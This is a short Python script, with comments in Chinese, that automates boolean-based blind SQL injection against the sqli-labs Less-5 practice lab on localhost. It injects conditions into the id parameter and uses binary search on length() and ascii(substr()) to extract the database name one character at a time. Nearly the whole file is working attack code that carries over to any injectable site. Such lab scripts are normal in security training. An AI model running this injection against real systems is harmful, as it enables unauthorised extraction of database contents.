import requests

url = "http://127.0.0.1/sqli-labs/Less-5/?id=1'"

def check(payload):
    """返回 True 表示条件成立（页面显示 You are in...）"""
    r = requests.get(url + payload)
    return "You are in..." in r.text

def get_length(query):
    """二分法获取查询结果的长度"""
    low, high = 1, 100
    while low < high:
        mid = (low + high) // 2
        if check(f" and length(({query}))>{mid} --+"):
            low = mid + 1
        else:
            high = mid
    # 循环结束后验证
    if check(f" and length(({query}))={low} --+"):
        return low
    return 0

def get_string(query, length):
    """二分法逐字符获取字符串"""
    result = ""
    for i in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if check(f" and ascii(substr(({query}),{i},1))>{mid} --+"):
                low = mid + 1
            else:
                high = mid
        # 循环结束后 low 就是该字符的 ASCII 码
        result += chr(low)
        print(f"\r[+] 正在获取: {result}", end="")
    print()  # 换行
    return result

# 1. 获取数据库名
db_len = get_length("database()")
print(f"[数据库名长度] {db_len}")
db_name = get_string("database()", db_len)
print(f"[数据库名] {db_name}")